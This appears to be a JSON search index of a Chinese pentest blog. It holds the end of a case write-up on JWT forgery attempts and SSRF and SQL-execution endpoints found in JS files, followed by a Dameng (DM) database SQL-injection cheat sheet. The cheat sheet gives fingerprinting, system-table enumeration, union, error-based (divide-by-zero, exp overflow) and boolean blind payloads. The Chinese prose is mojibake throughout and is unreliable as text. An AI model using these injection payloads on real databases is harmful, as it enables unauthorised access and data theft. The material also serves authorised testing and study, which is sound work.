åç»­å°è¯•åˆ©ç”¨è¯¥secret keyè¿›è¡Œ JWT ä¼ªé€ ï¼Œä½†æ˜¯æ²¡æœ‰åˆ©ç”¨æˆåŠŸã€‚è¯´æ˜å½“å‰ç³»ç»Ÿçš„secret keyå¾ˆå¯èƒ½å·²ç»å˜æ›´äº†ã€‚ ä¸è¿‡é€šè¿‡è¿™ä¸ªJWTè§£ç åï¼Œè·å–åˆ°äº†ç”¨æˆ·åxxxxdemo1 åç»­å¯ä»¥å°è¯•ç”¨æˆ·åå¯†ç æšä¸¾ï¼Œä¸è¿‡å½“å‰ç¯å¢ƒä¸‹æ²¡æœ‰è¿™ä¸ªæ¡ä»¶ã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:4:0","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"åç»­ åç»­å®¢æˆ·ç»™æˆ‘ä»¬æä¾›äº†æµ‹è¯•è´¦æˆ·ï¼Œåé¢çš„æµ‹è¯•å°±æ¯”è¾ƒæ­£å¸¸äº†ã€‚ä¸è¿‡ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæµ‹è¯•è´¦å·æƒé™æ¯”è¾ƒä½ï¼Œåæ­£æ‰€æä¾›çš„è´¦æˆ·æ˜¯æ²¡æœ‰ä¹‹å‰å‘ç°çš„SQLæ‰§è¡Œå’ŒSSRFçš„æ¥å£çš„ã€‚ æ‰€ä»¥è¿˜æ˜¯è¦å…³æ³¨ JSæ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œèƒ½æœ‰æ•ˆæ‰©å±•æˆ‘ä»¬çš„æ”»å‡»é¢ï¼Œä¹Ÿè®¸ä¼šæœ‰æ„å¤–ä¹‹å–œã€‚ æœ€åç¥å¤§å®¶å·¥ä½œé¡ºåˆ©ï¼ŒHave a nice day! ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:5:0","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["Pentest"],"content":" DMSQLæ³¨å…¥å°è®°ï¼Œè½¬æ‰‹å­˜ä¸ºç¬”è®°ï¼Œè¾…åŠ©æ—¥å¸¸å·¥ä½œã€‚éº»çƒ¦å¤§å®¶ä¹Ÿç‚¹ç‚¹åŸæ–‡é“¾æ¥ï¼Œæ¬¢è¿å¤§å®¶ç‚¹èµè¯„è®ºã€‚ åŸæ–‡é¦–å‘åœ¨ï¼šå…ˆçŸ¥ç¤¾åŒº https://xz.aliyun.com/t/16721 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:0:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®° ç›®å‰å›½äº§åŒ–è¶Šæ¥è¶Šæ™®åŠï¼Œå¹³æ—¶é‡åˆ°çš„è¾¾æ¢¦æ•°æ®åº“ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œå› æ­¤å†³å®šè¿›è¡Œä¸‹æ€»ç»“ã€‚ç”±äºæœ¬äººèƒ½åŠ›æœ‰é™ï¼Œå¦‚æœæ–‡ç« ä¸­æœ‰çº°æ¼æ¬¢è¿æŒ‡æ­£ï¼Œä¹Ÿæ¬¢è¿å¤§å®¶è¿›è¡Œäº¤æµã€‚ å®˜æ–¹å­˜åœ¨è¾¾æ¢¦çº¿ä¸Šå®éªŒå®¤ï¼Œå¯ä»¥åœ¨çº¿è¯•ç”¨è¾¾æ¢¦æ•°æ®åº“ï¼Œå…æ³¨å†Œï¼Œçœå»äº†è‡ªå·±ä¸‹è½½å®‰è£…çš„æ—¶é—´ã€‚ https://eco.dameng.com/tour/ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:1:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x01 åˆ¤æ–­DMSQL å¸¸è§çš„åˆ¤æ–­æ–¹æ³•å¦‚ä¸‹ï¼š æŠ¥é”™è¯­å¥ï¼š dm.jabc.driver.DMException æ—  updatexml ç­‰æ–¹æ³•ï¼Œ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:2:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x02 åŸºç¡€è¯­æ³• select user -- è¿”å›å½“å‰ç”¨æˆ·ï¼Œé»˜è®¤æ˜¯SYSDBA select user() -- åŒä¸Š select cur_database -- è¿”å›å½“å‰åº“åï¼Œé»˜è®¤æ˜¯DAMENG select cur_database() -- åŒä¸Š select 1 -- selectè¯­å¥åé¢å¯ä»¥ä¸è·Ÿè¡¨åï¼Œå­˜åœ¨é»˜è®¤è¡¨dualï¼Œå¯ä»¥æ¥from dual select 1 from dual where 1=1 \u0026\u0026 1=1 -- \u0026\u0026å¯ä»¥ä»£æ›¿andï¼Œä½†||ä¸èƒ½ä»£æ›¿or ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:3:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"2.1 æ³¨é‡Š SELECT 1; -- å•è¡Œæ³¨é‡Š select 1/*aaa*/from dual -- æ”¯æŒ/**/å¤šè¡Œæ³¨é‡Š ä¸æ”¯æŒ # å•è¡Œæ³¨é‡Š å’Œ/*! */å†…è”æ³¨é‡Š ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:3:1","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"2.2 å¸¸ç”¨è¿ç®—ç¬¦ DMSQLç¨‹åºæ•°æ®åº“ç±»å‹ä¸æ“ä½œç¬¦ å¸¸ç”¨è¿ç®—ç¬¦å·®å¼‚ä¸å¤§ï¼Œ\u0026\u0026 åŒ ANDï¼Œä½† || æ— æ³•ä»£æ›¿ ORã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:3:2","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x03 å‡½æ•°ç‰¹æ€§ md5(1) -- è¿”å› 0xC4CA4238A0B923820DCC509A6F75849Bï¼Œè¿”å›å¯¹åº”MD5å€¼ï¼Œå‰é¢åŠ äº†0x exp(if(1=1,710,1)) exp(710) -- è¿”å›æ•´æ•°æº¢å‡ºé”™è¯¯ï¼Œä½¿ç”¨è¿™ç§æ–¹å¼å¯ä»¥å¼ºåˆ¶BOOLç›²æ³¨ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.1 è¿›åˆ¶è½¬æ¢ ASCII(str) è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIå€¼, ASCII('a') = 97 char(num) è¿”å›å‚æ•°numå¯¹åº”çš„ASCIIå­—ç¬¦ï¼Œ chr(num) åŒä¸Šï¼ŒCHR(97) = a HEX(str) è¿”å›16è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼, hex(12) = 3132 UNHEX(str) è¿”å›å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œunhex(3132) = 12 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:1","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.2 å­—ç¬¦ä¸²æˆªå– substring('1234',2,1) -- åŒsubstrå‡½æ•° substr('1234',2,1) -- è¿”å›2ï¼Œç¬¬äºŒä¸ªå‚æ•°ä»ç¬¬å‡ ä½å¼€å§‹å–å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä»£è¡¨æˆªå›¾å¤šå°‘ä½ -- å¤šç§æ ¼å¼ SUBSTR(str,pos)ã€SUBSTR(str FROM pos)ã€SUBSTR(str,pos,len)ã€SUBSTR(str FROM pos FOR len), å¦‚ substr('1234' from 2 for 1) = 2 left('123456', 3) -- è¿”å›123ï¼Œç¬¬äºŒä¸ªå‚æ•°ä»£è¡¨è¿”å›å·¦è¾¹å‡ ä½çš„å­—ç¬¦ right('123456', 3) -- è¿”å›456ï¼Œç¬¬äºŒä¸ªå‚æ•°ä»£è¡¨è¿”å›å³è¾¹å‡ ä½çš„å­—ç¬¦ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:2","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.3 å­—ç¬¦ä¸²æ‹¼æ¥ || -- å°†å·¦å³ä¸¤ä¾§å­—ç¬¦ä¸²è¿›è¡Œè¿æ¥ CONCAT(str1,str2...) -- å°†å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² CONCAT_WS(separator,str1,str2...) -- é€šè¿‡åˆ†éš”ç¬¦separatorå°†å­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ· WM_CONCAT(column_name) -- ç±»ä¼¼ GROUP_CONCAT(...)ï¼Œå°†æŸä¸€åˆ—ä¸­çš„å¤šä¸ªå­—ç¬¦ä¸²æŒ‰ç…§ä¸€å®šé¡ºåºæ‹¼æ¥æˆä¸€ä¸ªå¤§çš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”¨äºåˆ†ç»„åçš„å­—ç¬¦ä¸²æ‹¼æ¥ LISTAGG(column_name, separator) -- å’Œ WM_CONCAT ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”¨äºå°†åˆ†ç»„åçš„åˆ—å€¼è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶ä¸”æä¾›äº†æ›´å¤šçš„æ§åˆ¶é€‰é¡¹ï¼Œå¦‚æŒ‡å®šåˆ†éš”ç¬¦ç­‰ã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:3","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.4 å…¶ä»– LENGTH(str) -- è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ len(str) -- è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ LOWER(str) -- å°†å­—ç¬¦ä¸²å­—æ¯å…¨éƒ¨è½¬æˆå°å†™ã€‚åŒï¼šLCASE(str)ã€‚ UPPER(str) -- å°†å­—ç¬¦ä¸²å­—æ¯å…¨éƒ¨è½¬æˆå¤§å†™ã€‚åŒï¼šUCASE(str)ã€‚ TO_CHAR(date/time_value, 'format') -- å°†æ—¥æœŸã€æ—¶é—´ã€æ•°å­—ç­‰ç±»å‹çš„æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ç±»å‹ TO_NUMBER(char_value, 'format') -- å°†å­—ç¬¦ç±»å‹çš„æ•°æ®è½¬æ¢ä¸ºæ•°å­—ç±»å‹ TO_DATE(char_value, 'format') -- å°†å­—ç¬¦ç±»å‹çš„æ•°æ®è½¬æ¢ä¸ºæ—¥æœŸç±»å‹ã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:4","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x04 SQLi è·å–æ•°æ® æ³¨å…¥æ–¹å¼æ•´ä½“ä¸Šå’ŒOracleå·®ä¸å¤šï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›åŒºåˆ«ã€‚ æ³¨å…¥è¯­å¥ï¼š ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.1 åŸºæœ¬ä¿¡æ¯ -- æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ SELECT banner FROM v$version; -- æ³¨æ„ï¼šè¿”å›æ˜¯å¤šè¡Œ SELECT banner FROM v$version limit 0,1; SELECT WM_CONCAT(banner) FROM v$version -- åœ¨ä¸€è¡Œä¸­æ˜¾ç¤º SELECT LISTAGG(banner, 'ï¼Œ ') FROM v$version; -- åœ¨ä¸€è¡Œä¸­æ˜¾ç¤ºï¼Œé«˜ç‰ˆæœ¬å¯ç”¨ -- è·å–å½“å‰ç”¨æˆ·ã€å½“å‰æ•°æ®åº“ select user select user() SELECT user FROM DUAL; select cur_database -- è·å–æ‰€æœ‰ç”¨æˆ·å select USERNAME from SYS.ALL_USERS select WM_CONCAT(USERNAME) from SYS.ALL_USERS ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:1","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.2 æŸ¥è¯¢å…¨å±€å˜é‡ éœ€è¦å½“å‰ç”¨æˆ·å…·å¤‡æŸ¥è¯¢æƒé™ SELECT NAME, TYPE, VALUE FROM V$PARAMETER; NAMEåˆ—æ˜¾ç¤ºç³»ç»Ÿå‚æ•°çš„åç§°ï¼Œå¦‚BUFFER_POOL_SIZEï¼ˆç¼“å†²æ± å¤§å°ï¼‰ç­‰ï¼Œè¿™äº›å‚æ•°åç§°ç”¨äºæ ‡è¯†ä¸åŒçš„æ•°æ®åº“é…ç½®é¡¹ã€‚ TYPEåˆ—è¡¨ç¤ºå‚æ•°çš„ç±»å‹ï¼Œä¾‹å¦‚INTï¼ˆæ•´æ•°ç±»å‹ï¼‰ã€STRINGï¼ˆå­—ç¬¦ä¸²ç±»å‹ï¼‰ç­‰ï¼Œè¿™æœ‰åŠ©äºäº†è§£å‚æ•°å€¼çš„æ•°æ®æ ¼å¼ã€‚ VALUEåˆ—åˆ™æ˜¯å¯¹åº”çš„å‚æ•°å®é™…çš„å€¼ï¼Œä¾‹å¦‚å¯¹äºBUFFER_POOL_SIZEå‚æ•°ï¼ŒVALUEåˆ—å¯èƒ½æ˜¾ç¤ºä¸€ä¸ªè¡¨ç¤ºå¤§å°çš„æ•°å­—ï¼ˆå•ä½å¯èƒ½æ ¹æ®å‚æ•°å®šä¹‰è€Œä¸åŒï¼‰ã€‚ å¸¸è§æœ‰ç”¨çš„å…¨å±€å˜é‡å¦‚ä¸‹ï¼š NAME VALUE SYSTEM_PATH /home/dmdba/data/DAMENG CONFIG_PATH /home/dmdba/data/DAMENG TEMP_PATH /home/dmdba/data/DAMENG BAK_PATH /home/dmdba/data/DAMENG/bak DFS_PATH $/DAMENG INSTANCE_NAME DMSERVER INSTANCE_ADDR PORT_NUM 5236 SVR_LOG_NAME SLOG_ALL TRACE_PATH /home/dmdba/data/DAMENG/trace BCT_PATH /home/dmdba/data/DAMENG å¦‚æœåªæƒ³æŸ¥è¯¢ç‰¹å®šçš„å…¨å±€å˜é‡ï¼Œå¯ä»¥åœ¨æŸ¥è¯¢è¯­å¥ä¸­æ·»åŠ ç­›é€‰æ¡ä»¶ã€‚ æŸ¥è¯¢è¯­å¥ï¼š SELECT VALUE FROM V$PARAMETER WHERE NAME = 'SYSTEM_PATH'; SELECT NAME, VALUE FROM V$PARAMETER WHERE name LIKE '%INSTANCE%' ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:2","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.3 æŸ¥è¯¢ç³»ç»Ÿè¡¨ 1ï¼‰ æŸ¥è¯¢åº“å SYS.SYSOBJECTSè¡¨ä¸­ä¿å­˜å…¨éƒ¨çš„åº“åä¿¡æ¯ã€‚ æŸ¥è¯¢æ‰€æœ‰çš„åº“åå’Œå¯¹åº”ID select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCH' 2ï¼‰ æŸ¥è¯¢è¡¨å SYS.SYSOBJECTS è¡¨ä¸­åŒæ—¶ä¿å­˜å…¨éƒ¨çš„è¡¨åä¿¡æ¯ã€‚ æŸ¥è¯¢æ‰€æœ‰çš„è¡¨åã€‚å…¶ä¸­SCHIDæ¥è‡ªæ­¥éª¤1ï¼‰ä¸­è·å¾—çš„ID select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCHOBJ' and SUBTYPE$='UTAB' and SCHID=150995949 3ï¼‰ æŸ¥è¯¢åˆ—å SYS.SYSCOLUMNS è¡¨ä¸­å­—æ®µåç§°å’Œå­—æ®µç±»å‹ã€‚ æŸ¥è¯¢æ‰€æœ‰è¡¨å¯¹åº”çš„åˆ—åã€‚å…¶ä¸­IDä¸ºæ­¥éª¤2ï¼‰ä¸­è·å–çš„ID select NAME,TYPE$,DEFVAL from SYS.SYSCOLUMNS where ID=1078 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:3","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.4 æŸ¥è¯¢è§†å›¾ 1ï¼‰ æŸ¥è¯¢ç”¨æˆ· æŸ¥è¯¢å…¨éƒ¨æ•°æ®åº“çš„ç”¨æˆ·å select USERNAME from SYS.ALL_USERS 2ï¼‰ æŸ¥è¯¢åº“å æŸ¥è¯¢å…¨éƒ¨åº“åï¼Œå…¶ä¸­ OWNER æ˜¯æ­¥éª¤1ï¼‰å¯¹åº”çš„æ•°æ®åº“ç”¨æˆ·åã€‚ select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='SYSDBA' and OBJECT_TYPE='SCH' 3ï¼‰ æŸ¥è¯¢è¡¨å æŸ¥è¯¢å…¨éƒ¨è¡¨åï¼Œ OWNER æ˜¯æ­¥éª¤2ï¼‰å¯¹åº”çš„åº“åã€‚ select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='OTHER' and OBJECT_TYPE='TABLE' 4ï¼‰ æŸ¥è¯¢åˆ—å å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼è¿”å›æŒ‡å®šæ¡ä»¶å¯¹åº”çš„åˆ—åï¼Œå…¶ä¸­SCHEMA_NAMEä»£è¡¨åº“åï¼ŒTABLE_NAMEä»£è¡¨è¡¨åã€‚ select OWNER,TABLE_NAME,SCHEMA_NAME,COLUMN_NAME from SYS.ALL_COL_COMMENTS where SCHEMA_NAME='OTHER' and TABLE_NAME='xxxxxx' ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:4","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x05 è”åˆæŸ¥è¯¢æ³¨å…¥ Union æ³¨å…¥ä¸å¸¸è§„çš„æ²¡ä»€ä¹ˆåŒºåˆ« order by num union select 1,2,3... -- æ³¨æ„åˆ—æ•°å’Œç±»å‹è¦ç›¸åŒ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:6:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x06 æŠ¥é”™æ³¨å…¥ å¸¸è§„çš„æŠ¥é”™å‡½æ•°éƒ½ä¸å¤ªè¡Œï¼Œæ— æ³•ç›´æ¥è·å–ç»“æœã€‚ä¸»è¦åˆ©ç”¨çš„æ˜¯ é™¤0é”™è¯¯ã€æº¢å‡ºé”™è¯¯ï¼Œç»“åˆå¸ƒå°”æ³¨å…¥è¿›è¡Œã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:7:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"6.1 é™¤0é”™è¯¯ select 1 from dual where 1=1/0 ç»“åˆå¸ƒå°”æ³¨å…¥è¿›è¡Œæ¢æµ‹ SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=1/if(len(user)=6,1,0) ORDER BY id DESC; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:7:1","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"6.2 æº¢å‡ºé”™è¯¯ select exp(710) select exp(if(1=1,710,1)) -- æ•°æ®æº¢å‡º select exp(if(len(user)=6,710,1)) SELECT * FROM t1 where rownum\u003c5 AND 1=exp(if(len(user)=6,710,0)) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id,exp(if(len(user)=6,711,0)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id DESC, exp(if(len(user)=6,710,0)); ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:7:2","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x07 å¸ƒå°”ç›²æ³¨ å¸ƒå°”ç›²æ³¨è¯­æ³• if(exprï¼Œå‚æ•°1ï¼Œå‚æ•°2) -- expræˆç«‹æ—¶ï¼Œè¿”å›å‚æ•°1çš„å€¼;ä¸æˆç«‹æ—¶ï¼Œè¿”å›å‚æ•°2çš„å€¼ CASE WHEN exp THEN state1 ELSE state2 END -- åŒIF DECODE(expr, search1, result1 [, search2, result2,...][, default_result]) -- ç±»ä¼¼ switch case, å¦‚æœ expr=search1ï¼Œåˆ™è¿”å› result1ï¼Œå¦åˆ™è¿”å›default_result IFNULL(expr1,expr2) -- å¦‚æœ expr1 ä¸ä¸º NULLï¼Œåˆ™è¿”å› expr1ï¼Œå¦åˆ™è¿”å› expr2 NULLIF(expr1,expr2) -- 